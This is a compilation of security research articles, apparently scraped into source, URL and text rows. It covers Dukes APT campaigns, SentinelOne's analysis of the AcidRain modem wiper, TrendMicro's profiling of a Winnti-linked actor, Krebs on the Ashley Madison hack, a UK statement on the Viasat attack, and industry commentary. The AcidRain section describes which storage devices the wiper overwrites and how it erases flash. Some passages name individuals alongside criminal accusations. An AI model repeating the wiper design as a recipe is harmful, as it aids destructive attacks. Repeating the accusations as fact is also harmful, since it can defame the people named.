A month later, GReAT discovered two more previously unknown infection mechanisms for MiniDuke, which relied on Java and Internet Explorer vulnerabilities to infect the victim’s PC.

After Kaspersky’s reports of these attacks, the rest of 2013 saw reduced intensity of the campaign. But then, following an upsurge in attacks in the second half of 2014, GReAT characterized MiniDuke, CosmicDuke and the actor’s Nemesis Gemina project - targeting government, diplomatic, energy, military and telecom operators - as ‘one of the world’s most unusual APT operations’ due to:

Its use of a customized backdoor written in Assembler using ‘old school’ virus writing techniques and habits

A unique C2 mechanism that uses multiple redundancy paths, including Twitter accounts

Stealthy transfer of updates as executables hidden inside GIF files (a form of steganography)

How CozyDuke attacks

The CozyDuke malware utilizes a backdoor and dropper, and exfiltrates data to a C2 server. CozyDuke droppers and spyware components often maintain fairly common characteristics, but the files’ functionality is slightly modified depending on the actor’s needs.

In 2015 GReAT reported that CozyDuke often spear phishes targets with emails containing a link to a hacked website. Sometimes this was a high profile, legitimate site such as ‘diplomacy.pl’ hosting a ZIP archive. The archive contained a RAR SFX which installed the malware and showed an empty PDF decoy.

In other highly successful runs, the actor sent out phony Flash videos directly as email attachments. A clever example was ‘Office Monkeys LOL Video.zip’. The executable within this not only played a very funny video, but dropped and ran another CozyDuke executable. The videos were quickly passed around offices while users’ systems were silently infected in the background, and many of the APT’s components were signed with phony Intel and AMD digital certificates.

The file collected system information, and then invoked a WMI instance in the rootsecuritycenter namespace to identify security products installed on the system before dropping more data collection malware. The code hunted for several security products to evade – including Kaspersky.

Also in 2015, GReAT identified the Minidionis threat (known by Kaspersky as CloudLook) to be another backdoor from the same APT actor – this time using a cloud drive capability to store and download malware onto infected systems using a multi-dropper scheme.

To get in, the attacker used spear phishing emails with a self-extracting archive attachment pretending to be a voicemail. When the victim opened an archive, a second stage dropper executed and a WAV file played like a real voicemail. In its spear phish, CloudLook also used a self-extracting archive containing a PDF file that lured its victims with information regarding world terrorism.

New Dukes

In November 2016, Volexity documented new Dukes-related activity involving spear phishing with links to a ZIP archive containing a malicious LNK file, which would run PowerShell commands to install a new custom backdoor called PowerDuke. Although this wave did not use any zero day exploits, it relied on steganography and NTFS alternate data streams to complicate detection. According to Kaspersky telemetry, targeted organizations included think tanks and individuals working in various areas related to security and geopolitics.

Another wave of suspected Dukes attacks was identified in November 2018 by FireEye, this time again relying on Windows LNK files and deploying Cobalt Strike. Attribution to the Dukes was made partly on the LNK file structure and other TTPs, including the targets of the attack. According to Kaspersky telemetry, targeted organizations included political bodies in Europe.

In October 2019, ESET published “Operation Ghost” detailing a set of new trojans used by the Dukes, including PolyglotDuke, RegDuke and FatDuke. Created between 2017 and 2019, these fill a gap in the Dukes’ activity, proving a continued, under the radar presence.

SentinelOne Labs,https://www.sentinelone.com/labs/acidrain-a-modem-wiper-rains-down-on-europe/,"By Juan Andres Guerrero-Saade (@juanandres_gs) and Max van Amerongen (@maxpl0it)

Executive Summary

On Thursday, February 24th, 2022, a cyber attack rendered Viasat KA-SAT modems inoperable in Ukraine.

Spillover from this attack rendered 5,800 Enercon wind turbines in Germany unable to communicate for remote monitoring or control.

Viasat’s statement on Wednesday, March 30th, 2022 provides a somewhat plausible but incomplete description of the attack.

SentinelLabs researchers discovered new malware that we named ‘AcidRain’.

AcidRain is an ELF MIPS malware designed to wipe modems and routers.

We assess with medium-confidence that there are developmental similarities between AcidRain and a VPNFilter stage 3 destructive plugin. In 2018, the FBI and Department of Justice attributed the VPNFilter campaign to the Russian government

AcidRain is the 7th wiper malware associated with the Russian invasion of Ukraine.

Update: In a statement disseminated to journalists, Viasat confirmed the use of the AcidRain wiper in the February 24th attack against their modems.

Context

The Russian invasion of Ukraine has included a wealth of cyber operations that have tested our collective assumptions about the role that cyber plays in modern warfare. Some commentators have voiced a bizarre disappointment at the ‘lack of cyber’ while those at the coalface are overwhelmed by the abundance of cyber operations accompanying conventional warfare. From the beginning of 2022, we have dealt with six different strains of wiper malware targeting Ukraine: WhisperKill, WhisperGate, HermeticWiper, IsaacWiper, CaddyWiper, and DoubleZero. These attacks are notable on their own. But there’s been an elephant in the room by way of the rumored ‘satellite modem hack’. This particular attack goes beyond Ukraine.

We first became aware of an issue with Viasat KA-SAT routers due to a reported outage of 5,800 Enercon wind turbines in Germany. To clarify, the wind turbines themselves were not rendered inoperable but “remote monitoring and control of the wind turbines” became unavailable due to issues with satellite communications. The timing coincided with the Russian invasion of Ukraine and suspicions arose that an attempt to take out Ukrainian military command-and-control capabilities by hindering satellite connectivity spilled over to affect German critical infrastructure. No technical details became available; technical speculation has been rampant.

On Wednesday, March 30th, 2022, Viasat finally released a statement stating that the attack took place in two phases: First, a denial of service attack coming from “several SurfBeam2 and SurfBeam2+ modems and […other on-prem equipment…] physically located within Ukraine” that temporarily knocked KA-SAT modems offline. Then, the gradual disappearance of modems from the Viasat service. The actual service provider is in the midst of a complex arrangement where Eutalsat provides the service, but it’s administered by an Italian company called Skylogic as part of a transition plan.

The Viasat Explanation

At the time of writing, Viasat has not provided any technical indicators nor an incident response report. They did provide a general sense of the attack chain with conclusions that are difficult to reconcile.

Viasat reports that the attackers exploited a misconfigured VPN appliance, gained access to the trust management segment of the KA-SAT network, moved laterally, then used their access to “execute legitimate, targeted management commands on a large number of residential modems simultaneously”. Viasat goes on to add that “these destructive commands overwrote key data in flash memory on the modems, rendering the modems unable to access the network, but not permanently unusable”.

It remains unclear how legitimate commands could have such a disruptive effect on the modems. Scalable disruption is more plausibly achieved by pushing an update, script, or executable. It’s also hard to envision how legitimate commands would enable either the DoS effects or render the devices unusable but not permanently bricked.

In effect, the preliminary Viasat incident report posits the following requirements:

Could be pushed via the KA-SAT management segment onto modems en masse Would overwrite key data in the modem’s flash memory Render the devices unusable, in need of a factory reset or replacement but not permanently unusable.

With those requirements in mind, we postulate an alternative hypothesis: The threat actor used the KA-SAT management mechanism in a supply-chain attack to push a wiper designed for modems and routers. A wiper for this kind of device would overwrite key data in the modem’s flash memory, rendering it inoperable and in need of reflashing or replacing.

Subsequent to this post being published, Viasat confirmed to journalists that our analysis was consistent with their reports.

Viasat told BleepingComputer that “The analysis in the SentinelLabs report regarding the ukrop binary is consistent with the facts in our report – specifically, SentinelLabs identifies the destructive executable that was run on the modems using a legitimate management command as Viasat previously described”.

The AcidRain Wiper

On Tuesday, March 15th, 2022, a suspicious upload caught our attention. A MIPS ELF binary was uploaded to VirusTotal from Italy with the name ‘ukrop’. We didn’t know how to parse the name accurately. Possible interpretations include a shorthand for “ukr”aine “op”eration, the acronym for the Ukrainian Association of Patriots, or a Russian ethnic slur for Ukrainians – ‘Укроп’. Only the incident responders in the Viasat case could say definitively whether this was in fact the malware used in this particular incident. We posit its use as a fitting hypothesis and will describe its functionality, quirky development traits, and possible overlaps with previous Russian operations in need of further research.

Technical Overview

SHA256 9b4dfaca873961174ba935fddaf696145afe7bbf5734509f95feb54f3584fd9a SHA1 86906b140b019fdedaaba73948d0c8f96a6b1b42 MD5 ecbe1b1e30a1f4bffaf1d374014c877f Name ukrop Magic ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked, stripped First Seen 2022-03-15 15:08:02 UTC

AcidRain’s functionality is relatively straightforward and takes a bruteforce attempt that possibly signifies that the attackers were either unfamiliar with the particulars of the target firmware or wanted the tool to remain generic and reusable. The binary performs an in-depth wipe of the filesystem and various known storage device files. If the code is running as root, AcidRain performs an initial recursive overwrite and delete of non-standard files in the filesystem.

Following this, it attempts to destroy the data in the following storage device files:

Targeted Device(s) Description /dev/sd* A generic block device /dev/mtdblock* Flash memory (common in routers and IoT devices) /dev/block/mtdblock* Another potential way of accessing flash memory /dev/mtd* The device file for flash memory that supports fileops /dev/mmcblk* For SD/MMC cards /dev/block/mmcblk* Another potential way of accessing SD/MMC cards /dev/loop* Virtual block devices

This wiper iterates over all possible device file identifiers (e.g., mtdblock0 – mtdblock99), opens the device file, and either overwrites it with up to 0x40000 bytes of data or (in the case of the /dev/mtd* device file) uses the following IOCTLS to erase it: MEMGETINFO, MEMUNLOCK, MEMERASE, and MEMWRITEOOB. In order to make sure that these writes have been committed, the developers run an fsync syscall.

When the overwriting method is used instead of the IOCTLs, it copies from a memory region initialized as an array of 4-byte integers starting at 0xffffffff and decrementing at each index. This matches what others had seen after the exploit had taken place.

The code for both erasure methods can be seen below:

Once the various wiping processes are complete, the device is rebooted.

This results in the device being rendered inoperable.

An Interesting Oddity

Despite what the Ukraine invasion has taught us, wiper malware is relatively rare. More so wiper malware aimed at routers, modems, or IoT devices. The most notable case is VPNFilter, a modular malware aimed at SOHO routers and QNAP storage devices, discovered by Talos. This was followed by an FBI indictment attributing the operation to Russia (APT28, in particular). More recently, the NSA and CISA attributed VPNFilter to Sandworm (a different threat actor attributed to the same organization, the Russian GRU) as the U.K.’s National Cyber Security Centre (NCSC) described VPNFilter’s successor, Cyclops Blink.

VPNFilter included an impressive array of functionality in the form of multi-stage plugins selectively deployed to the infected devices. The functionality ranges from credential theft to monitoring Modbus SCADA protocols. Among its many plugins, it also included functionality to wipe and brick devices as well as DDoS a target.

The reason we bring up the specter of VPNFilter is not because of its superficial similarities to AcidRain but rather because of an interesting (but inconclusive) code overlap between a specific VPNFilter plugin and AcidRain.

VPNFilter Stage 3 Plugin – ‘dstr’

SHA256 47f521bd6be19f823bfd3a72d851d6f3440a6c4cc3d940190bdc9b6dd53a83d6 SHA1 261d012caa96d3e3b059a98388f743fb8d39fbd5 MD5 20ea405d79b4de1b90de54a442952a45 Description VPNFilter Stage 3, ‘dstr’ module Magic ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked, stripped First Seen 2018-06-06 13:02:56 UTC

After the initial discovery of VPNFilter, additional plugins were revealed by researchers attempting to understand the massive spread of the botnet and its many intricacies. Among these were previously unknown plugins, including ‘dstr’. As the mangled name suggests, it’s a ‘destruction’ module meant to supplement stage 2 plugins that lacked the ‘kill’ command meant to wipe the devices.

This plugin was brought to our attention initially by tlsh fuzzy hashing, a more recent matching library that’s proven far more effective than ssdeep or imphash in identifying similar samples. The similarity was at 55% to AcidRain with no other samples being flagged in the VT corpus. This alone is not nearly enough to conclusively judge the two samples as tied, but it did warrant further investigation.

VPNFilter and AcidRain are both notably similar and dissimilar. They’re both MIPS ELF binaries and the bulk of their shared code appears to stem from statically-linked libc. It appears that they may also share a compiler, most clearly evidenced by the identical Section Headers Strings Tables.

And there are other development quirks, such as the storing of the previous syscall number to a global location before a new syscall. At this time, we can’t judge whether this is a shared compiler optimization or a strange developer quirk.

More notably, while VPNFilter and AcidRain work in very different ways, both binaries make use of the MEMGETINFO, MEMUNLOCK, and MEMERASE IOCTLS to erase mtd device files.

There are also notable differences between VPNFilter’s ‘dstr’ plugin and AcidRain. The latter appears to be a far sloppier product that doesn’t consistently rise to the coding standards of the former. For example, note the redundant use of process forking and needless repetition of operations.

They also appear to serve different purposes, with the VPNFilter plugin targeting specific devices with hardcoded paths, and AcidRain taking more of a “one-binary-fits-all” approach to wiping devices. By brute forcing device filenames, the attackers can more readily reuse AcidRain against more diverse targets.

We invite the research community to stress test this developmental overlap and contribute their own findings.

Conclusions

As we consider what’s possibly the most important cyber attack in the ongoing Russian invasion of Ukraine, there are many open questions. Despite Viasat’s statement claiming that there was no supply-chain attack or use of malicious code on the affected routers, we posit the more plausible hypothesis that the attackers deployed AcidRain (and perhaps other binaries and scripts) to these devices in order to conduct their operation.

While we cannot definitively tie AcidRain to VPNFilter (or the larger Sandworm threat cluster), we note a medium-confidence assessment of non-trivial developmental similarities between their components and hope the research community will continue to contribute their findings in the spirit of collaboration that has permeated the threat intelligence industry over the past month.

TrendMicro Research,https://www.trendmicro.com/en_us/research/17/d/pigs-malware-examining-possible-member-winnti-group.html,"Updated on April 26, 2017, 01:39 PM (UTC-7) to add the accurate IP address.

In one of our previous blog entries, we covered how the threat actor known as Winnti was using GitHub to spread malware – a development that shows how the group is starting to evolve and use new attack methods beyond their previous tactics involving targeted attacks against gaming, pharmaceutical, and telecommunications companies. Through this entry, in which we take a closer look at an individual who we believe might be connected to the Winnti group, we hope to give both ordinary users and organizations better insights into some of the tools – notably the server infrastructures- these kinds of threat actors use, as well as the scale in which they operate.

Searching Domain Registrations for Clues

Threat actors typically register and use several domains in order to discretely lead their malware to their Command and Control (C&C) servers. Registering a domain name always requires some form of identifying information: a physical or mailing address, an email address, and a phone number. Of these, a valid email address holds the greatest importance because it is where the registrar sends the confirmation of a domain purchase to the new owner in addition to the information needed to control the domain.

Most fraudsters create one-time email addresses or use stolen email addresses, both of which are easy to create or obtain. However, over time, it becomes tedious for fraudsters to constantly change information when registering new domains. This is the point where they are likely to make mistakes and start reusing e-mail addresses.

A careful analysis of the domain registrations from this threat actor between 2014 and 2015 allowed us to identify one profile used to register several domains that were used as C&C servers for a particular malware family employed by the Winnti group. In particular, we managed to gather details on an individual using the handle Hack520, who we believe is connected to Winnti.

Who is the Winnti group?

The group behind the Winnti malware (which we will call the Winnti group for brevity) sprung up as a band of traditional cyber crooks, comprising black hats whose technical skills were employed to perpetrate financial fraud. Based on the use of domain names they registered, the group started out in the business of fake/rogue anti-virus products in 2007. In 2009, the Winnti group shifted to targeting gaming companies in South Korea using a self-named data- and file-stealing malware.

The group, which was primarily motivated by profit, is noted for utilizing self-developed technically-proficient tools for their attacks. They once attacked a game server to illicitly farm in-game currency (“gaming gold”, which also has real-world value) and stole source codes of online game projects. The group also engaged in the theft of digital certificates which they then used to sign their malware to make them stealthier. The Winnti group diversified its targets to include enterprises such as those in pharmaceutics and telecommunications. The group has since earned infamy for being involved in malicious activities associated with targeted attacks, such as deploying spear-phishing campaigns and building a backdoor.

During the course of researching the Winnti group, we came across previously unreported malware samples that we attributed to the group based on the malware arsenal and the use of registered domains as attack infrastructure. These samples led us to the discovery of additional C&C servers that provided us with more information than we initially expected.

A closer look at Hack520

Our initial investigation on the domains registered by Hack520 revealed that similar domains (listed below) were registered by another profile.

hack520[.]co[.]kr

shaiya[.]kr

zhu[.]kr

shenqi[.]kr

zhuxian[.]kr

Several of these domains are linked to variants of malware that were used by the Winnti threat actor. Surprisingly enough, it does not take very long to get some information about Hack520: someone with this handle runs a blog and a Twitter account (with a handle close to Hack520) that is also directly linked to the blog.

Figure 1: Twitter account of Hack520

One interesting detail about Hack520 is his apparent love for pigs, as seen in his use of the word in his email addresses. He also mentions his occupation as a “pig farmer” in online message boards. In addition, Hack520’s tweets always show photos of the same animal, which is likely his pet pig.

The Twitter handle used by Hack520 indicates also an “est” portion. This “est” reference could refer to a hacking group with its own message board on which hack520 also posts regularly.

In one particular forum post, Hack520 mentions that he was previously jailed for a period of 10 months in a blog post dated May 31, 2009.

Figure 2: Post from Hack520’s blog

A rough translation of this message is as follows:

“Fxxk, when I am released, the server is offline, I can’t find the machine, the domain is expired, it is so bad. I wasted 10 months, I have failed and lost my money.”

Hack520 seems to be very interested in hosting services and his profile fits that of a system administrator profile with some programming and hacking skills.

After further research, we were able to link Hack520 to different network administration activities, notably with a Virtual Private Server (VPS) hosting service. The way Hack520 signs his messages in one hacker forum provides a clue pointing to this connection. While one of his signatures uses his own blog domain, there is also a second signature which uses 93[.]gd, a domain that was found to have been actively selling VPS services in the past. The email address admin@93[.]gd is linked to IP addresses owned by a certain user with the nickname “PIG GOD”—another reference to Hack520’s passion for pigs.

Among the IP addresses owned by Hack520 is a whole/22 IP Range which we dubbed as the “PIG RANGE”. The IP range for “PIG GOD” is 43[.]255[.]188.0/22, which appears to be hosted in Hong Kong as seen in the information we found:

inetnum: 43[.]255[.]188[.]0 - 43[.]255[.]191[.]255

netname: PIG-HK

description: PIG GOD

country: HK

admin-c: PG406-AP

tech-c: PG406-AP

person: pig god

country: HK

phone: +852-39437000

e-mail: admin@66[.]to

nic-hdl: PG406-AP

mnt-by: MAINT-RAIBOW-HK

changed: admin@66[.]to 20160917

source: APNIC

The domain 66[.]to leads to another website that shows Hack520’s pet pig. It also reveals direct links to secure[.]66[.]to and zhu[.]vn, both of which also belong to Hack520 and contains his personal blog.

Figure 3: Hack520’s pet pig

We were able to find additional links between Hack520’s “Pig network” and the Winnti group’s activities. This includes hosting C&C domains that were used by Winnti such as mtrue.com, shenqi[.]kr and zhu[.]kr. We also found a live service selling VPS hosting at secure[.]66[.]to. The hosting services offered at secure[.]66[.]to are in fact hosting services rented to other companies worldwide. The contents found in secure[.]66[.]to often lead to zhu[.]vn, which is Hack520’s domain for hosting his own private blog.

Figure 4: Screenshot of secure[.]66[.]to

We found roughly 500 domain names that lead or have led to the “Pig network” between 2015 to March 2017. Most of these domains seem to have contained illegitimate content like pornography and online gambling. We highly suspect the “Pig network” to have also been used as a bulletproof hosting service for cybercriminals who are unrelated to the Winnti group. From what we’ve seen in Hack520’s blog, as well as the infrastructure deployed around it, it is quite safe to say that Hack520 is involved in aspects of the VPS service activity provided to groups like Winnti and other cybercriminals or threat actors.

What we’ve learned

Threat actors like the Winnti group rarely ever stay static in terms of both tools and tactics. As we’ve already previously discussed in our 2017 predictions, these groups will constantly evolve and employ unique and advanced attack techniques. In addition, individuals like Hack520 prove that these threat actors are composed of varied individuals who have their own set of expertise. All of these things point to threat actors and groups like Winnti will continue to try different methods of attack.

Threat actors are always looking to expand the strategies they use, thus security practices and solutions that work for less organized cybercriminals might not work for determined groups who are willing to spend time, resources and manpower to accomplish their goals. As such, there is a need for everyone to be proactive when it comes to security, especially for organizations who are frequently the victims of targeted attacks. By creating awareness and using the right solutions, both individuals and organizations can take the steps needed to defend against the malicious tactics used by threat actors like the Winnti group."

Webroot Blog,https://www.webroot.com/blog,"The RSA Conference 2022 – one of the world’s premier IT security conferences – was held June 6th-9th in San Francisco. The first in-person event for RSA since the global pandemic had a slightly lower turnout than in years past (26,000 compared to 36,000 attendees). But attendees and presenters alike made up for it with their eagerness to explore emerging IT security trends that have developed over the past year – a venue like RSA Conference 2022 delivered on tenfold.

Following the remote work pivot we saw in 2020, IT security has had to evolve quickly to remain effective, flexible and resilient in today’s dynamic hybrid/remote work environments. This year’s RSA Conference and the upcoming Black Hat USA 2022 in August are providing vital venues for IT security pros and business leaders to address challenges in today’s rapidly evolving security landscape.

Here are some of the key trends which we observed at this year’s first marquee cybersecurity event post-pandemic:

1. Market landscape for XDR grows more crowded

RSAC was abuzz with numerous security providers – large vendors and small start-ups alike – promoting capabilities and options offering new flavors of EDR and MDR. Based on the customer and analyst interactions, it was evident that the definition of XDR is still evolving, and that customers are still trying to determine what is the best solution for their specific use case.

Most customers alluded to the cybersecurity skills shortage; one of the key market drivers remains a “managed” component tailored to organizations’ response capabilities. As the sophistication of malicious actors is growing rapidly, fundamentals such as initial compromise detection and lateral movement prevention still seem to define customers’ preferences.

2. Threat intelligence becomes key to addressing workforce gap

With new threats emerging daily, the industrywide shortage of skilled professionals is placing additional stress on security teams. Threat intelligence solutions using AI/ ML technologies can prevent false positives and reduce alert fatigue – helping cybersecurity professionals focus on strategic priorities instead of spending all their time reacting to security alerts and potential incidents.

We have seen this trend building over the years as increasing numbers of security appliance vendors have come to rely on our BrightCloud® Threat Intelligence for its accuracy, depth and contextual intelligence in order to stay a step ahead of a rapidly evolving threat landscape.

3. Cyber insurance becomes mainstream discussion

As cyberattacks have become more costly and more challenging to track, cyber insurance has gained prominence across the industry. Unfortunately, as cyber risks mount, insurers are raising prices for coverage, requiring customers to answer lengthy questionnaires and limiting who they provide cyber insurance coverage to.

The cyber insurance market is expected to reach around $20B by 2025. However, as MSPs and customers look to cyber insurance to manage their risk exposure, more emphasis is expected on the fine print of the coverage – in particular, on exclusions and limits around brand reputation and restoring normal operations.[NL1]

4. Business Email Compromise gains prominence

Although there is a mounting body of evidence that shows ransomware is and will continue to be a concern for businesses, there’s also an argument to be made for an eventual slowdown in ransomware attacks. As discussed at this year’s RSA conference, many preventative measures such as law enforcement crackdowns, tighter cryptocurrency regulations and ransomware-as-a-service (RaaS) operator shutdowns are putting pressure on ransomware perpetrators.

Phishing has now become the most popular avenue of attack for hackers because it’s relatively easy to trick people into clicking on malicious links. 96% of phishing attacks are sent via email – and 74% of US businesses have fallen victim to phishing attacks. This is what prompted the FBI to issue a warning about the $43B impact of Business Email Compromise (BEC) scams.

5. Cyber Resilience planning puts focus on recovery readiness

The growth in digital attack surfaces has added a new dimension to traditional data protection approaches in terms of compliance with emerging regulations. This theme was validated in the day-two keynote, where panelists reiterated the importance of data protection and governance in the context of privacy.

This year, ransomware events have increased by more than 10%, and the average cost of a data breach to organizations has risen to $4.2 million. Customers are increasingly taking steps to protect their data, with an emphasis on recovery and minimizing downtime. This growing focus on becoming cyber resilient is a wise course of action in a threat landscape in which malicious actors only need to get lucky once!"

Hexacorn Blog,https://www.hexacorn.com/blog,"Have you ever wondered where all the threat intel feeds come from? How do these companies know that this, or that email account has been compromised? How do they identify breaches, early? How do they collect data in a way that does not force them to manually search the internet, dark web, social media, join highly vetted dodgy forums?

The answer is simple:

they hoard lots of data

they automate the process of acquiring this data, and

they keep themselves in the loop.

Here’s list of data sources, assets, know-how they leverage:

networking (many years in the industry helps to build connections, relationships, and people moving around between different companies still keep in touch, often sharing highly confidential information between themselves; it’s often the best source of intel, really) – this involves industry peers, but also Law Enforcement, Cloud providers, FinTech, Card Schemes contacts, and … yes, Clients!

participation in trusted/vetted peer groups (often focused on ransomware, emerging threats, criminal activities, BEC, etc.)

methodology and know-how learned working for the government agencies drives activities in a proper direction — not rewriting the news, but actively participating in strategic processes by providing information to support C-level individuals so they can make educated decisions about IT and IT Security

data from security sensors (AV, EDR, FIM, email, proxy logs, etc.) – both high-fidelity detections, and low-, mid- fidelity threat hunting exercises, ideally, across many environments; also, asset inventories!

OS vendors and selected software shops have access to crash reports (often indicating failed exploitation attempts, and sometimes in progress)

ongoing web crawling, mirroring, and scraping (what is there today, may not be available tomorrow, plus, building the most comprehensive data sets is a must – everything is assumed to be ephemeral!)

social media analysis

security vendor reports

gov agencies reports (f.ex. CISA, FBI)

card schemes reports

*-ISAC reports

specific entities covering 0days (f.ex. Project Zero)

staying up to date with the CVE security vulnerability database

understanding the historical context (f.ex. trends in security, ups and downs, bugtraq, etc.)

actively pursuing understanding of IT Security domain in the the most broadest way (f.ex. CISSP, CISM, SANS courses, but also reading RFCs, OS internals, etc.)

working and being comfortable with Vulnerability Management circles

working with Support functions (often being the first one to hear about ‘something funny going on’)

ongoing repository searches (f.ex. github)

ongoing cloud storage facilities scans (f.ex. S3)

DNS and WHOIS data analysis

internet-wide data analysis (f.ex. shodan, alexa, umbrella, etc.)

actively pursuing at least high-level info/know-how on actively developing domains/new areas of interest (f.ex. DoH, deep fakes, SaaS threat models)

ongoing dark web scraping and analysis

analysis of data dumps from past breaches

leveraging findings from DFIR engagements

malware sample metadata collection – identifying IOCs

malware sample sandboxing (f.ex. extracting configs, credentials, domains, emails, (S)FTP accounts) – identifying TTPs

clean sample metadata collection – to understand how ‘good’ looks like

hacking admin panels (gray area, but it does happen)

purchasing software and services from ‘providers’ with a sole purpose of analysing them

virustotal rules (f.ex. for textual files that look like credential dumps)

leveraging existing data sets (f.ex. pihole, ad-blocking lists)

leveraging passive DNS

purchasing data dumps from dodgy providers

purchasing feeds from other threat intel providers

purchasing VPN software to ID their IPs

TOR-new identity rotation to discover TOR IPs

analytics of disposable emails and messaging platforms

setting up canary tokens

setting up google alerts

maintaining a network of informers (I made it up, but maybe it does happen)

leveraging and aggregating various rules f.ex.: yara, sigma, suricata, lol-anything

leveraging Red Team-related project announcements (code injections, evasions, new techniques, iterations of existing techniques, etc.)

leveraging existing threat encyclopedias (f.ex. malpedia, APTNotes)

leveraging malware samples repos (f.ex. vx-underground, virusshare, malshare, etc.)

active and ongoing manual OSINT research

leveraging publicly available research (new ideas, powerful google or shodan dorks, etc.)

following developments in areas parallel to malware and hacking f.ex. game cheating, warez, P2P, TOR, AI, new programming languages, platforms, package managers

learning about and embracing new asset inventory tools (f.ex. for Cloud)

leveraging information obtained from clients (f.ex. during tabletop or IR preparedness exercises, hardening exercises, presales and sales talks, SOWs, questionnaires)

acquiring existing Threat Intel companies

poaching experienced Threat Intel analysts

PR stunts

As you can see, it’s a piece of cake.

When I started jotting these items down I thought it will be probably 10-15 items, max. It’s actually over 50 now and I am sure there is actually more… If you can think of any that I missed, please let me know and I will add it to the list. TA!

Can you start your own TI company today?

Probably, but it’s gonna cost you, and the existing companies that have millions of dollars in their budget will not give their piece of the pie away easily…

Full disclosure: I have never ran a Threat Intel company or function. After years of not seeing much value in TI I finally grew up, and feel that this discipline will mature in ways most of us will find surprising. Especially in purchasing decision area. This is why I wrote that other post."

In an age where cables seem reserved for data centers or industrial facilities, and wireless rules the home and office, this hub is a relic of days gone past.

KrebsOnSecurity,https://krebsonsecurity.com/,"[This is Part II of a story published here last week on reporting that went into a new Hulu documentary series on the 2015 Ashley Madison hack.]

It was around 9 p.m. on Sunday, July 19, when I received a message through the contact form on KrebsOnSecurity.com that the marital infidelity website AshleyMadison.com had been hacked. The message contained links to confidential Ashley Madison documents, and included a manifesto that said a hacker group calling itself the Impact Team was prepared to leak data on all 37 million users unless Ashley Madison and a sister property voluntarily closed down within 30 days.

The message included links to files containing highly sensitive information, including snippets of leaked user account data, maps of internal AshleyMadison company servers, employee network account information, company bank account data and salary information.

A master employee contact list was among the documents leaked that evening. Helpfully, it included the cell phone number for Noel Biderman, then the CEO of Ashley Madison parent firm Avid Life Media (ALM). To my everlasting surprise, Biderman answered on the first ring and acknowledged they’d been hacked without even waiting to be asked.

“We’re on the doorstep of [confirming] who we believe is the culprit, and unfortunately that may have triggered this mass publication,” Biderman told me on July 19, just minutes before I published the first known public report about the breach. “I’ve got their profile right in front of me, all their work credentials. It was definitely a person here that was not an employee but certainly had touched our technical services.”

On Aug 18, 2015, the Impact Team posted a “Time’s up!” message online, along with links to 60 gigabytes of Ashley Madison user data. The data leak led to the public shaming and extortion of many Ashley Madison users, and to at least two suicides. Many other users lost their jobs or their marriages. To this day, nobody has been charged in the hack, and incredibly Ashley Madison remains a thriving company.

THE CHAOS MAKER

The former employee that Biderman undoubtedly had in mind on July 19, 2015 was William Brewster Harrison, a self-described expert in search engine optimization (SEO) tricks that are designed to help websites increase their rankings for various keywords in Google and other search engines.

It is evident that Harrison was Biderman’s top suspect immediately after the breach became public because — in addition to releasing data on 37 million users a month later in August 2015 — the hackers also dumped three years worth of email they stole from Biderman. And Biderman’s inbox is full of messages about hate-filled personal attacks from Harrison.

A Native of Northern Virginia, Harrison eventually settled in North Carolina, had a son with his then-wife, and started a fence-building business. ALM hired Harrison in March 2010 to promote its various adult brands online, and it is clear that one of his roles was creating and maintaining female profiles on Ashley Madison, and creating blogs that were made to look like they were written by women who’d just joined Ashley Madison.

It appears Harrison was working as an affiliate of Ashley Madison prior to his official employment with the company, which suggests that Harrison had already demonstrated he could drive signups to the service and help improve its standing in the search engine rankings.

What is less clear is whether anyone at ALM ever performed a basic background check on Harrison before hiring him. Because if they had, the results almost certainly would have given them pause. Virginia prosecutors charged the young 20-something Harrison with a series of misdemeanors, including trespassing, unlawful entry, drunk in public, and making obscene phone calls.

In 2008, North Carolina authorities charged Harrison with criminal extortion, a case that was transferred to South Carolina before ultimately being dismissed. In December 2009, Harrison faced charges of false imprisonment, charges that were also dropped by the local district attorney.

By the time Ashley Madison officially hired him, Harrison’s life was falling apart. His fence business had failed, and he’d just filed for bankruptcy. Also, his marriage had soured, and after a new arrest for driving under the influence, he was in danger of getting divorced, losing access to his son, and/or going to jail.

It also seems likely that nobody at ALM bothered to look at the dozens of domain names registered to Harrison’s various Vistomail.com email addresses, because had they done so they likely would have noticed two things.

One is that Harrison had a history of creating websites to lambaste companies he didn’t like, or that he believed had slighted him or his family in some way. Some of these websites included content that defamed and doxed executives, such as bash-a-business[.]com, google-your-business[.]com, contact-a-ceo[.]com, lowes-is-a-cancer[.]com (according to Harrison, the home improvement chain once employed his wife).

A background check on Harrison’s online footprint also would have revealed he was a self-styled rapper who claimed to be an active menace to corporate America. Harrison’s website lyrical-gangsta[.]com included a number of works, such as “Slim Thug — I Run — Remix Spoof,” which are replete with menacing words for unnamed corporate executives:

UK Government News,https://www.gov.uk/government/news/russia-behind-cyber-attack-with-europe-wide-impact-an-hour-before-ukraine-invasion,"new UK and US intelligence suggests Russia was behind an operation targeting commercial communications company Viasat in Ukraine

incident on 24 February caused outages for several thousand Ukrainian customers, and impacted windfarms and internet users in central Europe

cyber security leaders from the 5 Eyes, EU and other international allies meet at the NCSC’s Cyber UK conference in Newport today to discuss shared threats

Russia has been behind a series of cyber-attacks since the start of the renewed invasion of Ukraine, the EU, UK, US and other allies have announced today (10 May). The most recent attack on communications company Viasat in Ukraine had a wider impact across the continent, disrupting wind farms and internet users in central Europe.

The UK’s National Cyber Security Centre (NCSC) assesses that the Russian Military Intelligence was almost certainly involved in the 13 January defacements of Ukrainian government websites and the deployment of Whispergate destructive malware. The NCSC also assesses that it is almost certain Russia was responsible for the subsequent cyber-attack impacting Viasat on 24 February.

On 24 February, a cyber-attack against Viasat began approximately 1 hour before Russia launched its major invasion of Ukraine. Although the primary target is believed to have been the Ukrainian military, other customers were affected, including personal and commercial internet users. Wind farms in central Europe and internet users were also affected.

Viasat has said that “tens of thousands of terminals have been damaged, made inoperable and cannot be repaired.”

Foreign Secretary Liz Truss said:

This is clear and shocking evidence of a deliberate and malicious attack by Russia against Ukraine which had significant consequences on ordinary people and businesses in Ukraine and across Europe. We will continue to call out Russia’s malign behaviour and unprovoked aggression across land, sea and cyberspace, and ensure it faces severe consequences.

Today’s announcement comes as cyber security leaders from the 5 Eyes, EU and international allies meet at the NCSC’s Cyber UK conference in Newport to discuss the cyber threats facing the world.

